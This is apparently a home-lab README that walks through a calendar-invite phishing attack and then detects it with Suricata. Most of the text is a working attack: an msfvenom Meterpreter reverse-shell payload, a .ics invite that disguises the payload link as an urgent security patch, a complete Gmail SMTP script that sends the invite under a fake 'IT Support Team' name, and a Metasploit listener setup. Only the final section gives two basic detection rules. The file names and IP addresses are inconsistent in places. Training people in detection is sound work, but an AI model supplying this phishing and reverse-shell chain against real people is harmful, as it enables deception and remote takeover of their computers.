### 🛡️Google-Calendar-Phishing-Attack-Suricata-and-Wazuh-Detection-Project
This project demonstrates a realistic phishing attack using a malicious .ics calendar invite to deliver a payload and how to detect and alert on it using Suricata IDS.

## 📌 Lab Setup

| **Component** | **Role** | **OS* | **Notes** |
|---------------|-------------|---------------|-------------|
| **Attacker**  | Ubuntu VM (Kali Linux can also be used) | **Ubuntu 22.04**  | Runs sendmail, hosts payload, sends phishing email |
| **Victim**    | Windows 10 VM with Wazuh Agent installed | **Windows 10**   | Opens .ics invite and executes payload |
| **Network**   | Bridged Mode (same subnet for both VMs) | **Network**   |Allows both VMs to share network with host |
| **IDS**   | Suricata | **On Ubuntu**   | Detects C2 traffic from payload |


## ✅Phase 1: Setup and File Hosting on /Ubuntu VM
# 🎯Goal
Generate a reverse shell payload to be delivered via phishing.
# 🛠️1.1 Generate Payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
```
Replace LHOST with your Ubuntu attacker's IP address.

**Check the Payload File:**
```bash
ls -lh newpayload.exe
```
**Move the payload to the Apache web root:**
```bash
sudo mv payload.exe /var/www/html/
```
**Set correct permissions (optional but good)**
```bash
sudo chmod 755 /var/www/html/payload.exe
```
**Start Apache web server:**
```bash
sudo systemctl start apache2
```
Now payload is at:
http://192.168.56.107/newpayload.exe

## Phase 2: 📆Create Malicious Calendar Invite (.ics)

Create a file named malicious_invite.ics:
```bash
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//hacksw/handcal//NONSGML v1.0//EN
BEGIN:VEVENT
UID:20250606T120000Z-123456@example.com
DTSTAMP:20250606T120000Z
DTSTART:20250606T130000Z
DTEND:20250606T133000Z
SUMMARY:Urgent Security Update
DESCRIPTION:Please click this link to install the security patch:\n\nhttp://192.168.0.107/newpayload.exe
LOCATION:http://192.168.0.107/newpayload.exe
END:VEVENT
END:VCALENDAR
```
## 🧪 How to Create and Use It
# 📁 1. Save the .ics File
```bash
nano malicious_invite.ics
```
## Phase 3: 📧 Send Phishing Email (from Ubuntu)
**We need a Python script that sends an email with a proper calendar invite .ics attachment, including a friendly sender name, via Gmail SMTP.**

What you need before running:
-Python 3 installed
-smtplib and email modules (built-in, no install needed)
-Gmail App Password if your account has 2FA enabled (recommended)
-Your .ics file ready

## Python script to send .ics invite with friendly sender name
# 📁 Save the .py File
```bash
nano send_calendar_invite.py
```
Copy And Paste this Script
```bash
import smtplib
from email.message import EmailMessage
from email.utils import formataddr

SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# Your Gmail credentials (use App Password if 2FA enabled)
GMAIL_USER = 'your_gmail_address'
GMAIL_PASS = 'your_app_password_here'  # Replace with your app password

FROM_NAME = 'IT Support Team'
FROM_EMAIL = 'itsupport@example.com'
TO_EMAIL = 'victim_mail_address'
SUBJECT = 'Urgent Security Update Required'

with open('malicious_invite.ics', 'r') as f:
    ics_content = f.read()

msg = EmailMessage()
msg['Subject'] = SUBJECT
msg['From'] = formataddr((FROM_NAME, FROM_EMAIL))
msg['To'] = TO_EMAIL

msg.set_content("""\
Dear User,

Please find the attached calendar invite for the mandatory security update.

Best Regards,
IT Support Team
""")

msg.add_attachment(
    ics_content.encode('utf-8'),
    maintype='text',
    subtype='calendar',
    filename='invite.ics',
    disposition='attachment',
    headers=['Content-Class: urn:content-classes:calendarmessage']
)

try:
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(GMAIL_USER, GMAIL_PASS)
    server.send_message(msg)
    print("Email sent successfully!")
except Exception as e:
    print("Failed to send email:", e)
finally:
    server.quit()
```
## How to use:
1.Save this as send_calendar_invite.py in the same folder as your malicious_invite.ics.
2.Run the script with:
```bash
python3 send_calendar_invite.py
```
## 🖥️ Phase 4: Setup Wazuh Agent on Victim
🧰 Steps
1.	Download Wazuh Agent for Windows.
2.	During setup, enter your attacker's IP as Wazuh Manager.
4.	Start the agent from Windows Services.
Wazuh will log actions and forward events to the Wazuh Manager

## 🧪Phase 5: Execute the Attack
# 1. On the Windows VM (Victim):

Open Email Client:
  -Access the email account configured to receive the phishing email.
Open the Received Email:
  -Locate and open the email with the subject "Urgent Security Update Required".
Open the Attached Calendar Invite:
  -Open the malicious_invite.ics attachment.
Click the Link in the Invite:
  -Click on the link provided in the calendar invite to download the payload.
Execute the Payload:
  -Run the downloaded newpayload.exe file.

# 2.On the Kali Linux VM (Attacker):
# 1.Start Metasploit Listener:
```bash
msfconsole
```
# 2.Configure and Start the Handler:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
exploit
```
Replace 192.168.56.101 with your Kali Linux host-only IP address.
# 3.Establish Session:
Once the victim executes the payload, a Meterpreter session should be established.

## 🔍 Phase 5: Detecting the Attack with Suricata
## 1.Create Custom Suricata Rules
1.Edit local.rules File:
```bash
sudo nano /etc/suricata/rules/local.rules
```
2.Add the Following Rules:
```bash
alert http any any -> any any (msg:"Malicious Payload Accessed"; content:"/newpayload.exe"; http_uri; sid:1000001; rev:1;)
alert tcp any any -> any 4444 (msg:"Possible Reverse Shell Connection"; sid:1000002; rev:1;)
```
3.Save and Exit:
  -Press Ctrl + O to save.
  -Press Enter to confirm.
  -Press Ctrl + X to exit.
  
## Edit Suricata config to load local.rules
Open the Suricata configuration file:
```bash
sudo nano /etc/suricata/suricata.yaml
```
Search for the **rule-files**: section (press Ctrl+W then type rule-files:)
Modify it like this (if not already present):
```bash
rule-files:
  - local.rules
```
-Make sure this block is under the default-rule-path: section like below:
```bash
default-rule-path: /etc/suricata/rules
rule-files:
  - local.rules
```
## Test the Suricata configuration
```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```
You should see configuration OK. If not, check for spacing/indentation errors in YAML.

## Restart Suricata
```bash
sudo systemctl restart suricata
```
 ## Verify rule hits
 ```bash
sudo tail -f /var/log/suricata/fast.log
```
